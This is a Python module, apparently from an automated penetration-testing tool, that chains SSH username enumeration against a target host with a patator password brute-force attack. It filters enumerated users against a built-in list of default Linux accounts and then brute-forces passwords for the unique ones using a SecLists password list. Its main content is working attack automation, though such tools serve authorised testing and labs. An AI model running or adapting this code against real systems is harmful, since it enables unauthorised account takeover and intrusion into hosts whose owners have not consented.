#!/usr/bin/env python3

import os
from subprocess import call
from sty import fg, bg, ef, rs
import json

# from lib import nmapParser


class Brute:
    def __init__(self, target, serviceName, port):
        self.target = target
        self.serviceName = serviceName
        self.port = port
        self.unique_users = []

    def SshUsersBrute(self):
        cmd_info = "[" + fg.green + "+" + fg.rs + "]"
        green = fg.li_green
        teal = fg.li_cyan
        reset = fg.rs
        cwd = os.getcwd()
        # np = nmapParser.NmapParserFunk(self.target)
        # np.openPorts()
        # ssh_ports = np.ssh_ports
        reportDir = f"{cwd}/{self.target}-Report"
        if not os.path.exists(f"{reportDir}/ssh"):
            os.makedirs(f"{reportDir}/ssh")
        # print(f"Target:{self.target} serviceName:{self.serviceName} port:{self.port}")
        default_linux_users = [
            "root",
            "adm",
            "nobody",
            "mysql",
            "daemon",
            "bin",
            "games",
            "sync",
            "lp",
            "mail",
            "sshd",
            "ftp",
            "man",
            "sys",
            "news",
            "uucp",
            "proxy",
            "list",
            "backup",
            "www-data",
            "irc",
            "gnats",
            "systemd-timesync",
            "systemd",
            "systemd-network",
            "systemd-resolve",
            "systemd-bus-proxy",
            "_apt",
            "apt",
            "messagebus",
            "mysqld",
            "ntp",
            "arpwatch",
            "Debian-exim",
            "uuid",
            "uuidd",
            "dnsmasq",
            "postgres",
            "usbmux",
            "rtkit",
            "stunnel4",
            "Debian-snmp",
            "sslh",
            "pulse",
            "avahi",
            "saned",
            "inetsim",
            "colord",
            "_rpc",
            "statd",
            "shutdown",
            "halt",
            "operator",
            "gopher",
            "rpm",
            "dbus",
            "rpc",
            "postfix",
            "mailman",
            "named",
            "exim",
            "rpcuser",
            "ftpuser",
            "nfsnobody",
            "xfs",
            "gdm",
            "htt",
            "webalizer",
            "mailnull",
            "smmsp",
            "squid",
            "netdump",
            "pcap",
            "radiusd",
            "radvd",
            "quagga",
            "wnn",
            "dovecot",
            "avahi-autoipd",
            "libuid",
            "hplip",
            "statd",
            "bind",
            "haldaemon",
            "vcsa",
            "abrt",
            "saslauth",
            "apache",
            "nginx",
            "tcpdump",
            "memcached",
            "liquidsoap",
            "dhcpd",
            "clamav",
            "lxc-dnsmasq",
            "xrdp",
            "speech-dispatcher",
            "kernoops",
            "whoopsie",
            "lightdm",
            "syslog",
        ]
        cmd = f"python {cwd}/scripts/ssh_user_enum.py --port {self.port} --userList wordlists/usernames.txt {self.target} --outputFile {reportDir}/ssh/ssh-usernames.json --outputFormat json"
        print(cmd_info, cmd)
        print("This may take a few minutes.")
        call(cmd, shell=True)
        try:
            with open(f"{reportDir}/ssh/ssh-usernames.json") as json_file:
                data = json.load(json_file)
                num_valid_users = len(data["Valid"])
                # print(f"Number of valid users: {num_valid_users}")
                if num_valid_users < 55:
                    for valid in data["Valid"]:
                        if valid not in default_linux_users:
                            print(
                                f"{cmd_info} {teal}Unique User Found!{reset} {green}{valid}{reset}"
                            )
                            self.unique_users.append(valid)
                        else:
                            print(f"{cmd_info} " + valid)

                else:
                    print(f"OpenSSH returned too many false positives: {num_valid_users}")
        except FileNotFoundError as fnf_error:
            print(fnf_error)
            exit()

        if len(self.unique_users) > 0 and (len(self.unique_users) < 4):
            for u in self.unique_users:
                print(f"{teal}Beginning Password Brute Force for User:{reset} {green}{u}{reset}")
                patator_cmd = f"""patator ssh_login host={self.target} port={self.port} user={u} password=FILE0 0=/usr/share/seclists/Passwords/probable-v2-top1575.txt persistent=0 -x ignore:mesg='Authentication failed.'"""
                print(f"{cmd_info} {patator_cmd}")
                call(patator_cmd, shell=True)


class BruteSingleUser:
    def __init__(self, target, serviceName, port, user):
        self.target = target
        self.serviceName = serviceName
        self.port = port
        self.user = user

    def SshSingleUserBrute(self):
        # cwd = os.getcwd()
        # reportDir = f"{cwd}/{self.target}-Report"
        print("Not yet implimented")
        print(
            f"Target:{self.target} serviceName:{self.serviceName} port:{self.port} user:{self.user}"
        )


class BruteSingleUserCustom:
    def __init__(self, target, serviceName, port, user, passList):
        self.target = target
        self.serviceName = serviceName
        self.port = port
        self.user = user
        self.passList = passList

    def SshSingleUserBruteCustom(self):
        # cwd = os.getcwd()
        # reportDir = f"{cwd}/{self.target}-Report"
        print("Not yet implimented")
        print(
            f"Target:{self.target} serviceName:{self.serviceName} port:{self.port} user:{self.user} password list: {self.passList}"
        )
